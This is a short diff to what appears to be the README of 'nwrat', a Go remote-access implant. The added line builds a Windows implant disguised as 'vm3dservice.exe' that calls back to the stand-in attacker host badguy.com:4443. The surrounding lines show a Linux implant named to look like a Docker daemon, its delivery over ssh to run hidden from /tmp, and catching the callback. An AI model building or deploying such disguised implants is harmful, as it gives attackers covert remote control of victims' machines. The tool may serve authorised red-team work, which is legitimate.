@@ -36,6 +36,7 @@ go get github.com/magisterquis/nwrat
 go build github.com/magisterquis/nwrat
 # Build an implant for a different platform, setting the callback address
 GOOS=linux go build -o dockermoused -ldflags="-X main.callbackAddr=badguy.com:4443" github.com/magisterquis/nwrat
+GOOS=windows go build -o vm3dservice.exe -ldflags="-X main.callbackAddr=badguy.com:4443" github.com/magisterquis/nwrat
 # Put the implant on target it and run it
 ssh target 'cat >/tmp/dockermoused && chmod 0700 /tmp/dockermoused && /tmp/dockermoused &' <./dockermoused
 # Catch a callback
